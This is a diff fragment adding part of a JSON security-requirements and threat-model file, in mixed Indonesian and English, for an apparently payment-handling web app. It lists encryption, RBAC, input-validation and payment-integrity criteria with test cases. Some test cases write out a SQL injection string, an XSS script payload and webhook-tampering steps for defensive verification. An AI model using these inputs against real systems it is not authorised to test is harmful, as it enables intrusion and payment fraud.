+      "description": "Encrypt sensitive data di database dan dalam komunikasi network",
+
+      "acceptanceCriteria": [
+        "Semua data sensitive di database encrypted dengan AES-256",
+        "Sensitive fields: email, phone, address, password_hash, credit_card (partial)",
+        "Database connection menggunakan SSL/TLS encryption",
+        "API communication exclusively HTTPS (TLS 1.2 atau lebih tinggi)",
+        "Weak TLS ciphers disabled (no RC4, DES, 3DES, MD5)",
+        "Encryption keys stored dalam dedicated key management service (AWS KMS, HashiCorp Vault)",
+        "Key rotation policy: setiap 90 hari untuk data encryption keys",
+        "Database backups encrypted dengan strong cipher",
+        "PII data di API responses harus masked (email: user****@mail.com)",
+        "Sensitive data dalam logs harus redacted/masked"
+      ],
+
+      "testCases": [
+        "Verify TLS version: openssl s_client -connect api.server:443",
+        "Check database encryption: query SHOW VARIABLES LIKE 'default_encryption_algorithm'",
+        "Verify email stored encrypted: SELECT email FROM users WHERE id=1 (should be binary/encrypted)",
+        "Check API response: verify email is masked in JSON response"
+      ]
+    },
+
+    {
+      "id": "SEC-REQ-003",
+      "category": "Access Control",
+      "title": "Role-Based Access Control (RBAC) Implementation",
+      "priority": "CRITICAL",
+      "description": "Implement fine-grained access control berdasarkan user roles",
+
+      "acceptanceCriteria": [
+        "Setiap API endpoint memiliki authorization check dengan role verification",
+        "Minimal 3 roles: user, product_manager, admin dengan distinct permissions",
+        "User hanya dapat mengakses resources milik mereka sendiri",
+        "Admin endpoints require MFA authentication",
+        "Admin access restricted to whitelisted IP addresses (office/VPN only)",
+        "No endpoint should be accessible without authentication (except login/register)",
+        "Default-deny principle: jika tidak explicit allow, maka deny",
+        "Permission matrix documented dan version controlled",
+        "Regular audit untuk unusual access patterns dan privilege escalation attempts",
+        "Access denied attempts harus di-log dan di-alert"
+      ],
+
+      "testCases": [
+        "As regular user, attempt GET /api/admin/products, verify 403 Forbidden",
+        "As regular user, attempt PUT /api/users/2 (other user), verify 403",
+        "As admin without MFA, attempt admin endpoint, verify 401",
+        "Check audit logs for access denied attempts"
+      ]
+    },
+
+    {
+      "id": "SEC-REQ-004",
+      "category": "Input Validation",
+      "title": "Comprehensive Input Validation & Injection Prevention",
+      "priority": "CRITICAL",
+      "description": "Validate dan sanitize semua user input untuk prevent injection attacks",
+
+      "acceptanceCriteria": [
+        "Semua input dari user harus di-validate pada server-side (NEVER trust client)",
+        "Parameterized queries/prepared statements mandatory untuk semua database operations",
+        "Output encoding untuk prevent XSS (HTML entity encoding minimum)",
+        "Input size limits enforced (max 100KB per request, max 10KB per field)",
+        "Whitelist approach untuk acceptable input patterns (regex validation)",
+        "Special characters handled safely (no raw characters dalam queries/commands)",
+        "Rate limiting implementasi: 10 requests per minute per IP untuk public endpoints",
+        "CAPTCHA untuk sensitive operations: login, registration, payment",
+        "Content Security Policy (CSP) headers configured (frame-ancestors, script-src)",
+        "Error messages tidak expose system details atau input values"
+      ],
+
+      "testCases": [
+        "Attempt SQL injection: GET /api/products?search=' OR '1'='1, verify prevention",
+        "Attempt XSS: POST comment dengan <script>alert('xss')</script>, verify encoding",
+        "Send oversized payload (100MB), verify rejection",
+        "Check CSP headers: curl -I https://api.server | grep Content-Security-Policy",
+        "Rate limit test: send 11 requests in 1 minute, verify throttling on 11th"
+      ]
+    },
+
+    {
+      "id": "SEC-REQ-005",
+      "category": "Payment Security",
+      "title": "Secure Payment Processing & Transaction Integrity",
+      "priority": "CRITICAL",
+      "description": "Ensure secure payment handling dengan comprehensive validation dan fraud prevention",
+
+      "acceptanceCriteria": [
+        "Server-side price validation MANDATORY (recalculate total dari database prices)",
+        "Webhook signature verification untuk setiap payment callback (HMAC-SHA256)",
+        "Transaction signing implementasi untuk detect tampering",
+        "Idempotency key untuk prevent duplicate order processing",
+        "Pending transaction timeout: 15 menit (auto-cancel jika tidak completed)",
+        "Payment status synchronization dengan payment provider sebelum confirm",
+        "Merchant API keys secured dalam environment variables/key store (not hardcoded)",
+        "API key rotation policy: setiap 90 hari",
+        "Comprehensive transaction logging dengan immutable audit trail",
+        "Fraud detection rules: alert jika amount > threshold atau unusual patterns",
+        "PCI DSS compliance untuk credit card data handling",
+        "No credit card data stored di application database (use payment provider tokenization)"
+      ],
+
+      "testCases": [
+        "Attempt change order amount di frontend, verify server-side validation reject",
+        "Intercept webhook callback, modify status to 'success', verify signature check fail",
+        "Send duplicate payment callback, verify idempotency key prevent duplicate order",
+        "Wait 16 minutes for pending payment, verify auto-cancel",
+        "Send payment webhook dengan tampered signature, verify rejection",
+        "Query audit logs for payment transaction: verify immutable records exist"
+      ]
+    }
+  ],
+
+  "summary": {
+    "totalThreats": 9,
+    "criticalThreats": 6,
+    "highThreats": 3,
+    "mediumThreats": 0,
+    "totalMitigations": 52,
+    "securityRequirements": 5,
+    "estimatedImplementationEffort": "200 hours",
+    "riskLevel": "CRITICAL - Requires immediate remediation"
+  }
+}
